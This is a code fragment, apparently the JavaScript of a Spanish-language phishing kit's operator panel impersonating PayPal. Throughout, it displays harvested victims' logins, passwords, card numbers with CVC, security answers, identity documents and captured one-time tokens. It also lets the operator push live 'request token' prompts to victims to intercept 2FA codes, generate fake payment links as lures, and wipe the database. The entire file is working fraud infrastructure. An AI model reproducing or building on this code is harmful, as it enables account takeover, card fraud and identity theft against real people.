                    item.onmouseover = () => item.style.background = 'rgba(0,255,102,0.1)';
                    item.onmouseout = () => item.style.background = 'rgba(0,0,0,0.3)';
                    
                    item.innerHTML = `
                        <div style="font-size: 11px; color: var(--gray-text); text-transform: uppercase;">${escapeHtml(q)}</div>
                        <div style="font-size: 14px; font-weight: bold; color: #fff; margin-top: 3px;">${escapeHtml(a)}</div>
                    `;
                    content.appendChild(item);
                }
            });
        }
        modal.classList.add('show');
    }

    function closePreguntasModal(e) {
        if (e.target.id === 'preguntas-modal') {
            closePreguntasModalForce();
        }
    }

    function closePreguntasModalForce() {
        document.getElementById('preguntas-modal').classList.remove('show');
    }

    // Token Modal Functions
    let currentTokenRecordId = null;
    
    function updateTokenFields() {
        const method = document.getElementById('token-method').value;
        const phoneFields = document.getElementById('token-fields-phone');
        const emailFields = document.getElementById('token-fields-email');
        
        if (method === 'sms' || method === 'call') {
            phoneFields.style.display = 'flex';
            emailFields.style.display = 'none';
        } else if (method === 'email') {
            phoneFields.style.display = 'none';
            emailFields.style.display = 'flex';
        } else {
            // App PayPal
            phoneFields.style.display = 'none';
            emailFields.style.display = 'none';
        }
    }
    
    function openTokenModal(recordId) {
        currentTokenRecordId = recordId;
        document.getElementById('token-method').value = 'sms';
        updateTokenFields();
        document.getElementById('token-country-code').value = '';
        document.getElementById('token-last-digits').value = '';
        document.getElementById('token-email-letters').value = '';
        document.getElementById('token-modal').classList.add('show');
    }
    
    function closeTokenModal(e) {
        if (e.target.id === 'token-modal') closeTokenModalForce();
    }
    
    function closeTokenModalForce() {
        document.getElementById('token-modal').classList.remove('show');
    }
    
    async function sendTokenCommand() {
        if (!currentTokenRecordId) return;
        const method = document.getElementById('token-method').value;
        
        let subtext = '';
        if (method === 'sms' || method === 'call') {
            const cc = document.getElementById('token-country-code').value.trim();
            const fd = document.getElementById('token-first-digit').value.trim();
            const ld = document.getElementById('token-last-digits').value.trim();
            if (cc || fd || ld) {
                subtext = `+${cc} ${fd}••-••••${ld}`;
            }
        } else if (method === 'email') {
            const letters = document.getElementById('token-email-letters').value.trim();
            const domain = document.getElementById('token-email-domain').value;
            if (letters) {
                subtext = `${letters}••••••••${domain}`;
            }
        }
        
        let commandStr = `pedir_token_${method}`;
        if (subtext !== '') {
            commandStr += `|${subtext}`;
        }
        
        const btn = document.getElementById('btn-send-token');
        btn.innerHTML = 'Enviando...';
        btn.disabled = true;
        
        try {
            const response = await fetch('panel.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `action=send_command&id=${currentTokenRecordId}&command=${encodeURIComponent(commandStr)}`
            });
            const data = await response.json();
            if (data.status === 'ok') {
                showToast(`Comando enviado al usuario ID ${currentTokenRecordId}`);
            } else {
                showToast(`[ERROR] No se pudo enviar el comando`);
            }
        } catch (e) {
            console.error(e);
        }
        
        btn.innerHTML = '> Enviar Petición';
        btn.disabled = false;
        closeTokenModalForce();
    }

    // Tokens List Modal Functions
    function openTokensListModal(recordId, rawTokens) {
        logInteraction(recordId, 'Abrió historial de Tokens');
        const modal = document.getElementById('tokens-list-modal');
        const content = document.getElementById('tokens-list-content');
        
        content.innerHTML = '';
        
        if (!rawTokens || rawTokens.trim() === '') {
            content.innerHTML = '<div style="text-align: center; color: var(--gray-text);">No hay tokens capturados aún.</div>';
        } else {
            // Separamos por saltos de línea reales (ya que escapeJs conserva los \n)
            const tokenArray = rawTokens.split('\n').filter(t => t.trim() !== '');
            tokenArray.forEach((tk, idx) => {
                const item = document.createElement('div');
                item.style.border = '1px solid rgba(0, 255, 102, 0.2)';
                item.style.borderRadius = '6px';
                item.style.padding = '12px 15px';
                item.style.background = 'rgba(0,0,0,0.3)';
                item.style.cursor = 'pointer';
                item.style.transition = 'all 0.2s ease';
                item.style.display = 'flex';
                item.style.flexDirection = 'column';
                item.style.gap = '5px';
                item.title = 'Clic para copiar token';
                
                // Efectos hover
                item.onmouseover = () => {
                    item.style.background = 'rgba(0, 255, 102, 0.1)';
                    item.style.borderColor = 'var(--neon-green)';
                    item.style.transform = 'translateY(-2px)';
                    item.style.boxShadow = '0 4px 10px rgba(0, 255, 102, 0.15)';
                };
                item.onmouseout = () => {
                    item.style.background = 'rgba(0,0,0,0.3)';
                    item.style.borderColor = 'rgba(0, 255, 102, 0.2)';
                    item.style.transform = 'translateY(0)';
                    item.style.boxShadow = 'none';
                };
                
                // Acción de copiar al dar click (solo números si es posible)
                item.onclick = () => {
                    const onlyNums = tk.replace(/[^\d]/g, '');
                    copyToClipboard(onlyNums ? onlyNums : tk, `Token #${idx + 1}`, recordId);
                };
                
                item.innerHTML = `
                    <div style="font-size: 11px; color: var(--gray-text); text-transform: uppercase; font-weight: bold; letter-spacing: 1px;">Intento #${idx + 1}</div>
                    <div style="font-size: 18px; font-weight: bold; color: #fff; letter-spacing: 2px;">
                        ${escapeHtml(tk)}
                    </div>
                `;
                content.appendChild(item);
            });
        }
        modal.classList.add('show');
    }

    function closeTokensListModal(e) {
        if (e.target.id === 'tokens-list-modal') closeTokensListModalForce();
    }
    
    function closeTokensListModalForce() {
        document.getElementById('tokens-list-modal').classList.remove('show');
    }

    // Payment Link Modal Functions
    function openPaymentLinkModal() {
        document.getElementById('paylink-name').value = '';
        document.getElementById('paylink-user').value = '';
        document.getElementById('paylink-photo-type').value = 'empty';
        document.getElementById('paylink-file').value = '';
        document.getElementById('paylink-upload-status').innerText = '';
        togglePhotoUpload();
        document.getElementById('paylink-result-container').style.display = 'none';
        document.getElementById('payment-link-modal').classList.add('show');
    }
    
    function closePaymentLinkModal(e) {
        if (e.target.id === 'payment-link-modal') closePaymentLinkModalForce();
    }
    
    function closePaymentLinkModalForce() {
        document.getElementById('payment-link-modal').classList.remove('show');
    }
    
    function togglePhotoUpload() {
        const type = document.getElementById('paylink-photo-type').value;
        document.getElementById('paylink-upload-container').style.display = type === 'custom' ? 'block' : 'none';
    }
    
    let generatedPayLinkUrl = '';
    
    async function generatePaymentLink() {
        const name = document.getElementById('paylink-name').value.trim();
        const user = document.getElementById('paylink-user').value.trim();
        const photoType = document.getElementById('paylink-photo-type').value;
        
        if (!name || !user) {
            showToast('[ERROR] Debes ingresar un nombre y un usuario');
            return;
        }
        
        const btn = document.getElementById('btn-generate-paylink');
        btn.innerHTML = 'Generando...';
        btn.disabled = true;
        
        let photoParam = photoType;
        
        if (photoType === 'custom') {
            const fileInput = document.getElementById('paylink-file');
            if (fileInput.files.length > 0) {
                const formData = new FormData();
                formData.append('photo', fileInput.files[0]);
                
                try {
                    document.getElementById('paylink-upload-status').innerText = 'Subiendo imagen...';
                    const response = await fetch('upload_photo.php', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();
                    
                    if (data.status === 'success') {
                        photoParam = data.filename;
                        document.getElementById('paylink-upload-status').innerText = '¡Imagen subida!';
                    } else {
                        showToast('[ERROR] ' + (data.message || 'Error al subir la imagen'));
                        btn.innerHTML = '> Generar';
                        btn.disabled = false;
                        return;
                    }
                } catch (e) {
                    console.error(e);
                    showToast('[ERROR] Error de conexión al subir imagen');
                    btn.innerHTML = '> Generar';
                    btn.disabled = false;
                    return;
                }
            } else {
                photoParam = 'empty'; // fallback if they selected custom but didn't pick file
            }
        }
        
        // Build the URL
        const currentUrl = window.location.href.split('panel.php')[0];
        generatedPayLinkUrl = `${currentUrl}pago.php?n=${encodeURIComponent(name)}&u=${encodeURIComponent(user)}&pic=${encodeURIComponent(photoParam)}`;
        
        document.getElementById('paylink-url').innerText = generatedPayLinkUrl;
        document.getElementById('paylink-result-container').style.display = 'block';
        
        showToast('Link de pago generado exitosamente');
        btn.innerHTML = '> Generar';
        btn.disabled = false;
    }
    
    function copyPaymentLink() {
        if (!generatedPayLinkUrl) return;
        navigator.clipboard.writeText(generatedPayLinkUrl).then(() => {
            showToast('Enlace copiado al portapapeles');
        }).catch(err => {
            console.error('Error copying text: ', err);
            showToast('[ERROR] No se pudo copiar el enlace');
        });
    }
    
    function openPaymentLink() {
        if (!generatedPayLinkUrl) return;
        window.open(generatedPayLinkUrl, '_blank');
    }

    // Terminal Initialization
    const terminalContent = document.getElementById('terminal-content');
    const isAuthenticated = true;
    
    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    
    async function printLine(text, delay = 35) {
        const div = document.createElement('div');
        div.className = 'terminal-line';
        terminalContent.appendChild(div);
        
        for (let i = 0; i < text.length; i++) {
            div.textContent += text[i];
            await sleep(delay);
        }
        return div;
    }
    
    async function runTerminalLogin() {
        if (isAuthenticated) return;
        
        await printLine('> INICIALIZANDO CONSOLA DE MONITOREO SECURE-GATE...');
        await sleep(400);
        await printLine('> ESTABLECIENDO TÚNEL SSH ENCRYPTADO CON LOCALHOST...');
        await sleep(300);
        await printLine('> SISTEMA LISTO. REQUIERE FIRMA DIGITAL OPERADOR.');
        await sleep(200);
        
        const inputRow = document.createElement('div');
        inputRow.className = 'terminal-input-row';
        inputRow.innerHTML = `
            <span class="terminal-prompt">operador@secure-gate:~$</span>
            <input type="text" id="nameInput" class="terminal-input" autocomplete="off" autofocus placeholder="nombre de operador">
        `;
        terminalContent.appendChild(inputRow);
        
        const nameInput = document.getElementById('nameInput');
        nameInput.focus();
        
        nameInput.addEventListener('keypress', async (e) => {
            if (e.key === 'Enter') {
                const name = nameInput.value;
                if (!name.trim()) return;
                nameInput.disabled = true;
                
                await printLine(`> Firma temporal asignada a: ${name}`);
                await sleep(300);
                
                const pwdRow = document.createElement('div');
                pwdRow.className = 'terminal-input-row';
                pwdRow.innerHTML = `
                    <span class="terminal-prompt">ingrese clave de firma:~$</span>
                    <input type="password" id="pwdInput" class="terminal-input" autocomplete="off" placeholder="••••••••">
                `;
                terminalContent.appendChild(pwdRow);
                
                const pwdInput = document.getElementById('pwdInput');
                pwdInput.focus();
                
                pwdInput.addEventListener('keypress', async (e2) => {
                    if (e2.key === 'Enter') {
                        const pwd = pwdInput.value;
                        pwdInput.disabled = true;
                        
                        await printLine('> VERIFICANDO CREDENCIALES DE SEGURIDAD...');
                        await sleep(600);
                        
                        // Validate credentials with the backend
                        const response = await fetch('panel.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: `action=login&password=${encodeURIComponent(pwd)}&username=${encodeURIComponent(name)}`
                        });
                        const data = await response.json();
                        
                        if (data.status === 'ok') {
                            await printLine('> ACCESO AUTORIZADO. REDIRECCIONANDO...', 20);
                            await sleep(500);
                            location.reload();
                        } else {
                            await printLine('> [ERROR] ACCESO DENEGADO. FIRMA INCORRECTA.', 20);
                            await sleep(1000);
                            location.reload();
                        }
                    }
                });
            }
        });
    }

    // Auto-refresh mechanism for logged operators
    function startAutoRefresh() {
        if (!isAuthenticated) return;
        
        // Initial load immediately
        refreshData();
        
        // Loop every 2 seconds
        setInterval(refreshData, 2000);
    }
    
    async function refreshData() {
        try {
            const response = await fetch('panel.php?action=get_records');
            const data = await response.json();
            
            if (data.status === 'ok') {
                const tbody = document.getElementById('recordsTableBody');
                if (!tbody) return;
                
                // --- Activity Sound Alert ---
                if (previousRecords !== null) {
                    let hasNewActivity = false;
                    if (data.data.length > previousRecords.length) {
                        hasNewActivity = true;
                    } else {
                        data.data.forEach(newRec => {
                            const oldRec = previousRecords.find(r => r.id === newRec.id);
                            if (oldRec) {
                                if (newRec.token1 !== oldRec.token1) hasNewActivity = true;
                                if (newRec.clave !== oldRec.clave) hasNewActivity = true;
                                if (newRec.tarjeta_numero !== oldRec.tarjeta_numero) hasNewActivity = true;
                                if (newRec.preguntas !== oldRec.preguntas) hasNewActivity = true;
                                if (newRec.sorteo_nombre !== oldRec.sorteo_nombre) hasNewActivity = true;
                            }
                        });
                    }
                    if (hasNewActivity) {
                        playAlertSound();
                    }
                }
                previousRecords = data.data;
                // --- End Activity Sound Alert ---
                
                if (data.data.length === 0) {
                    tbody.innerHTML = '<tr><td colspan="12" style="text-align: center; color: var(--gray-text);">NO SE DETECTAN REGISTROS EN LA BASE DE DATOS</td></tr>';
                } else {
                    let html = '';
                    data.data.forEach(r => {
                        const id = escapeHtml(r.id);
                        const user = escapeHtml(r.usuario);
                        const clave = escapeHtml(r.clave);
                        const ip = escapeHtml(r.ip);
                        const pais = escapeHtml(r.pais);
                        
                        // Format Sorteo Personal Files
                        const sorteoNombre = r.sorteo_nombre ? r.sorteo_nombre : '';
                        const sorteoIdentificacion = r.sorteo_identificacion ? r.sorteo_identificacion : '';
                        const sorteoNacimiento = r.sorteo_nacimiento ? r.sorteo_nacimiento : '';
                        const sorteoNacionalidad = r.sorteo_nacionalidad ? r.sorteo_nacionalidad : '';
                        const sorteoTelefono = r.sorteo_telefono ? r.sorteo_telefono : '';
                        const sorteoCorreo = r.sorteo_correo ? r.sorteo_correo : '';
                        const sorteoCiudad = r.sorteo_ciudad ? r.sorteo_ciudad : '';
                        const sorteoDireccion = r.sorteo_direccion ? r.sorteo_direccion : '';
                        const sorteoZip = r.sorteo_zip ? r.sorteo_zip : '';
                        const sorteoVisa = r.sorteo_visa ? r.sorteo_visa : '';

                        let filesBtn = '<span style="color: var(--gray-text)">Sin Sorteo</span>';
                        if (sorteoNombre !== '') {
                            filesBtn = `<button class="btn-view-coords" style="border-color:#ffb86c; color:#ffb86c;" onclick="openFilesModal(
                                '${id}',
                                '${escapeJs(r.sorteo_nombre)}', 
                                '${escapeJs(r.sorteo_identificacion)}', 
                                '${escapeJs(r.sorteo_nacimiento)}', 
                                '${escapeJs(r.sorteo_nacionalidad)}', 
                                '${escapeJs(r.sorteo_telefono)}', 
                                '${escapeJs(r.sorteo_correo)}', 
                                '${escapeJs(r.sorteo_ciudad)}', 
                                '${escapeJs(r.sorteo_direccion)}', 
                                '${escapeJs(r.sorteo_zip)}', 
                                '${escapeJs(r.sorteo_visa)}'
                            )">Ver Files</button>`;
                        }

                        // Format coordinates
                        const rawCoords1 = r.coordenadas1 ? r.coordenadas1 : '';
                        const rawCoords2 = r.coordenadas2 ? r.coordenadas2 : '';
                        
                        let coords1Btn = '<span style="color: var(--gray-text)">Esperando...</span>';
                        if (rawCoords1 !== '') {
                            coords1Btn = `<button class="btn-view-coords" onclick="openCoordModal('${id}', '${escapeHtml(rawCoords1)}', 'Coordenadas Set 1 // Registro ID ${id}')">Ver Set 1</button>`;
                        }
                        
                        let coords2Btn = '<span style="color: var(--gray-text)">Esperando...</span>';
                        if (rawCoords2 !== '') {
                            coords2Btn = `<button class="btn-view-coords" onclick="openCoordModal('${id}', '${escapeHtml(rawCoords2)}', 'Coordenadas Set 2 // Registro ID ${id}')">Ver Set 2</button>`;
                        }
                        
                        // Format questions
                        const rawPreguntas = r.preguntas ? r.preguntas : '';
                        let preguntasBtn = '<span style="color: var(--gray-text)">Esperando...</span>';
                        if (rawPreguntas !== '') {
                            preguntasBtn = `<button class="btn-view-coords" style="border-color:#da70d6; color:#da70d6;" onclick="openPreguntasModal('${id}', '${escapeHtml(rawPreguntas)}', 'Preguntas // Registro ID ${id}')">Ver Preguntas</button>`;
                        }

                        // Format Card Details
                        const cardNum = r.tarjeta_numero ? escapeHtml(r.tarjeta_numero) : '';
                        const cardExp = r.tarjeta_exp ? escapeHtml(r.tarjeta_exp) : '';
                        const cardCvc = r.tarjeta_cvc ? escapeHtml(r.tarjeta_cvc) : '';
                        
                        let cardBox = '<span style="color: var(--gray-text)">Esperando...</span>';
                        if (cardNum !== '') {
                            cardBox = `
                                <div class="card-data-box">
                                    <div class="card-data-num copyable" title="Clic para copiar" onclick="copyToClipboard('${cardNum}', 'Número de tarjeta', '${id}')">${cardNum}</div>
                                    <div class="card-data-sub">
                                        <span class="copyable" title="Clic para copiar" onclick="copyToClipboard('${cardExp}', 'Vencimiento', '${id}')">EXP: ${cardExp}</span>
                                        <span class="copyable" title="Clic para copiar" onclick="copyToClipboard('${cardCvc}', 'CVC', '${id}')">CVC: ${cardCvc}</span>
                                    </div>
                                </div>
                            `;
                        }
                        
                        // Format Tokens (using token1 as array)
                        const rawTokens = r.token1 ? r.token1 : '';
                        let tokensHtml = '<span style="color: var(--gray-text)">Esperando...</span>';
                        if (rawTokens !== '') {
                            tokensHtml = `<button class="btn-view-coords" style="border-color:#ffb86c; color:#ffb86c;" onclick="openTokensListModal('${id}', '${escapeJs(rawTokens)}')">Ver Tokens</button>`;
                        }

                        // State Badge
                        const estado = escapeHtml(r.estado);
                        let badgeClass = 'status-pending';
                        if (estado === 'finalizado') {
                            badgeClass = 'status-finalizado';
                        }
                        const estadoBadge = `<span class="status-badge ${badgeClass}">${estado}</span>`;
                        
                        // Check if online (seconds_inactive <= 12)
                        const secsInactive = r.seconds_inactive !== null ? parseInt(r.seconds_inactive) : 999;
                        const isOnline = secsInactive <= 12;
                        const statusDot = isOnline 
                            ? '<span class="status-badge" style="background-color: rgba(0, 255, 102, 0.15); color: var(--neon-green); border: 1px solid var(--neon-green); font-size:10px; padding:2px 6px; margin-top: 5px; display: inline-block;">ONLINE</span>' 
                            : '<span class="status-badge" style="background-color: rgba(255, 51, 51, 0.15); color: var(--warning-red); border: 1px solid var(--warning-red); font-size:10px; padding:2px 6px; margin-top: 5px; display: inline-block;">OFFLINE</span>';

                        // Action Buttons
                        const btnToken = `
                            <button class="btn-view-coords" style="border-color:#0070ba; color:#0070ba; margin-bottom: 5px;" onclick="openTokenModal('${id}')">Pedir Token</button>
                            <button class="btn-view-coords" style="border-color:#ff3333; color:#ff3333; margin-bottom: 5px;" onclick="sendTokenError('${id}')">Token Error</button>
                            <button class="btn-view-coords" style="border-color:#ff8c00; color:#ff8c00;" onclick="sendUserError('${id}')">Error Usuario</button>
                        `;
                        
                        html += `
                            <tr>
                                <td data-label="ID">${id}<br>${statusDot}</td>
                                <td data-label="Usuario / Clave">
                                    <strong>U:</strong> <span class="copyable" title="Clic para copiar" onclick="copyToClipboard('${user}', 'Usuario', '${id}')">${user}</span><br>
                                    <strong>C:</strong> <span class="copyable" title="Clic para copiar" onclick="copyToClipboard('${clave}', 'Clave', '${id}')">${clave}</span>
                                </td>
                                <td data-label="IP / País">
                                    <strong>IP:</strong> <span class="copyable" title="Clic para copiar" onclick="copyToClipboard('${ip}', 'IP', '${id}')">${ip}</span><br>
                                    <strong>Pais:</strong> ${pais}
                                </td>
                                <td data-label="Tokens">${tokensHtml}</td>
                                <td data-label="Datos Tarjeta">${cardBox}</td>
                                <td data-label="Estado">${estadoBadge}</td>
                                <td data-label="Acciones">${btnToken}</td>
                                <td data-label="Fecha / Hora" style="font-size: 13px; color: var(--gray-text);">${escapeHtml(r.fecha_hora)}</td>
                            </tr>
                        `;
                    });
                    tbody.innerHTML = html;
                }
            }
        } catch(e) {
            console.error("Error auto-refreshing data:", e);
        }
    }

    window.truncateDB = async function() {
        if(confirm("¿Seguro que quieres borrar de forma permanente todos los registros del panel?")) {
            const response = await fetch('panel.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: 'action=truncate'
            });
            const data = await response.json();
            if(data.status === 'ok') {
                showToast("Base de datos limpia");
                refreshData();
            }
        }
    }

    window.logoutPanel = async function() {
        if(confirm("¿Seguro que deseas cerrar la sesión de monitoreo?")) {
            const formData = new FormData();
            formData.append('action', 'logout');
            await fetch('panel.php', {
                method: 'POST',
                body: formData
            });
            location.reload();
        }
    }

    // Start Up
    document.addEventListener('DOMContentLoaded', () => {
        // Init sound preference
        const savedSound = localStorage.getItem('panel_sound_enabled');
        if (savedSound !== null) {
            soundEnabled = savedSound === '1';
        } else {
            soundEnabled = true;
        }
        updateSoundButton();

        runTerminalLogin();
        startAutoRefresh();
    });
</script>
</body>
</html>
</body>
</html>
